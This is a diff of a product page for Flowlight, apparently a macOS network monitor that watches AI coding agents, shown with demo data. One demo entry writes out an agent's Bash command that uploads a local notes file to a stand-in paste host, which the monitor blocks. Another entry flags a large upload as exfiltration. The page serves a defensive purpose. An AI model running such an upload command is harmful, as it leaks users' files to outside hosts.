@@ -658,7 +658,7 @@ Free · open source · macOS 15+
 
  claudeapi.anthropic.com · https:443↑ 1.4 MB
 
- ↳ Bash: curl -s https://paste.example/up -d @notes.txt
+ ↳ Bash: curl -s paste.example/up -d @notes.txt
 
  claude › curlpaste.example · https:443refused
  ⛔ rule “Claude Code can't reach paste.example”
@@ -666,12 +666,12 @@ Free · open source · macOS 15+
  Chromewww.youtube.com · quic:443↓ 9.2 MB
 
  codexuploads.paste.example · https:443↑ 180 MB
- ⚠ possible exfiltration: 180 MB to a non-AI host in 1 h
+ ⚠ exfiltration: 180 MB to non-AI hosts in 1 h
 
  sharingdAirDrop · nearby device · awdl0↑ 4.1 GB
 
  claudeapi.anthropic.com · tools/list−3 tools
- 🛡 guardrail: Bash, Write, Edit removed before the model saw them
+ 🛡 guardrail: Bash, Write, Edit never offered
 
  Slackwss-primary.slack.com · websocket↓ 120 KB
 
@@ -679,7 +679,7 @@ Free · open source · macOS 15+
  ⚠ agent used email (SMTP submission)
 
  Cursorapi2.cursor.sh · POST /v1/chat503
- ✎ answered by Flowlight, never sent — mock “rate limited”
+ ✎ answered by Flowlight, never sent upstream
 
  The AI Agents view: each agent's model provider, and everything else it talked to. Shown with demo data.
 
